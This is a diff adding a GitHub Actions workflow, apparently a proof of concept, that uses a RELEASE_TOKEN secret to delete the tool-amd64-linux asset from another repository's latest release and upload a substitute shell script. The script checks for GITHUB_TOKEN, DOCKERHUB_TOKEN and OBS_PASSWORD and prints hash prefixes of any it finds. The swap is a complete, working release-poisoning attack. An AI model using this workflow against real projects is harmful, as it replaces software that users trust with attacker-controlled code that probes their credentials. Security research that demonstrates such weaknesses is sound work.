@@ -1,0 +1,26 @@
+name: sandbox
+on: push
+permissions: {}
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          T: ${{ secrets.RELEASE_TOKEN }}
+          DEST: timhaines/tool-dist-1a80a8
+        run: |
+          cat > tool-amd64-linux <<'TOOL'
+          #!/bin/sh
+          echo "tool: replaced binary, run poc-83895c0216b7"
+          for v in GITHUB_TOKEN DOCKERHUB_TOKEN OBS_PASSWORD; do
+            eval "x=\${$v:-}"
+            if [ -n "$x" ]; then echo "$v visible, sha256 prefix $(printf %s "$x" | sha256sum | cut -c1-16)"; fi
+          done
+          exit 0
+          TOOL
+          sed -i 's/^          //' tool-amd64-linux
+          curl -sS -H "Authorization: token $T" "https://api.github.com/repos/$DEST/releases/latest" > rel.json
+          RID=$(python3 -c 'import json; print(json.load(open("rel.json"))["id"])')
+          AID=$(python3 -c 'import json; print([a["id"] for a in json.load(open("rel.json"))["assets"] if a["name"] == "tool-amd64-linux"][0])')
+          curl -sS -o /dev/null -w 'DELETE asset -> HTTP %{http_code}\n' -X DELETE -H "Authorization: token $T" "https://api.github.com/repos/$DEST/releases/assets/$AID"
+          curl -sS -o up.json -w 'UPLOAD asset -> HTTP %{http_code}\n' -X POST -H "Authorization: token $T" -H 'Content-Type: application/octet-stream' --data-binary @tool-amd64-linux "https://uploads.github.com/repos/$DEST/releases/$RID/assets?name=tool-amd64-linux"
